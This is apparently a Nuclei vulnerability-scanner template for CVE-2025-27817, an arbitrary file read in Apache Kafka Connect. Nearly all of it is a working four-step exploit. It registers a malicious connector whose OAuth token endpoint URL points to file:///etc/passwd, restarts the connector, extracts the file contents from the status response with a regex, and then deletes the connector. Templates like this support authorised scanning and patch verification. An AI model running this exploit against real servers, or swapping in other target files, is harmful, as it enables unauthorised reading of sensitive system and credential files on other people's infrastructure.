id: CVE-2025-27817

info:
  name: Apache Kafka Connect - Arbitrary File Read
  author: appsploit
  severity: high
  description: |
    Apache Kafka Connect is vulnerable to arbitrary file read through malicious connector configuration.
    The vulnerability allows reading arbitrary files from the server by exploiting the OAuth token endpoint URL configuration.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-27817
  classification:
    cve-id: CVE-2025-27817
    cvss-score: 7.5
  tags: kafka,fileread,ssrf

variables:
  connector_name: "test-connector-{{rand_int(10000, 99999)}}"
  kafka_broker: "kafka:9092"
  target_file: "/etc/passwd"

http:
  # Step 1: Create malicious connector
  - method: POST
    path:
      - "{{BaseURL}}/connectors"

    headers:
      Content-Type: "application/json"

    body: |
      {
        "name": "{{connector_name}}",
        "config": {
          "connector.class": "org.apache.kafka.connect.mirror.MirrorHeartbeatConnector",
          "heartbeats.topic.replication.factor": "1",
          "replication.factor": "1",
          "source.cluster.alias": "source",
          "target.cluster.alias": "target",
          "source.cluster.bootstrap.servers": "{{kafka_broker}}",
          "target.cluster.bootstrap.servers": "{{kafka_broker}}",
          "topics": ".*",
          "groups": ".*",
          "sync.group.offsets.enabled": "true",
          "emit.heartbeats.enabled": "true",
          "producer.override.sasl.mechanism": "OAUTHBEARER",
          "producer.override.security.protocol": "SASL_PLAINTEXT",
          "producer.override.sasl.oauthbearer.token.endpoint.url": "file://{{target_file}}",
          "producer.override.sasl.jaas.config": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required;",
          "producer.override.sasl.login.callback.handler.class": "org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler"
        }
      }

    matchers:
      - type: status
        status:
          - 201
          - 200

  # Step 2: Restart connector to trigger file read
  - method: POST
    path:
      - "{{BaseURL}}/connectors/{{connector_name}}/restart"

    matchers:
      - type: status
        status:
          - 200
          - 202
          - 204

  # Step 3: Check status and extract file content
  - method: GET
    path:
      - "{{BaseURL}}/connectors/{{connector_name}}/status"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "root:x"
          - "sbin"
        condition: or

      - type: regex
        regex:
          - 'root:[^:]*:[0-9]+:[0-9]+'

    extractors:
      - type: regex
        name: file_content
        regex:
          - '(?s)root:.*?nologin'
        group: 0

  # Step 4: Cleanup - Delete connector
  - method: DELETE
    path:
      - "{{BaseURL}}/connectors/{{connector_name}}"

    matchers:
      - type: status
        status:
          - 200
          - 204
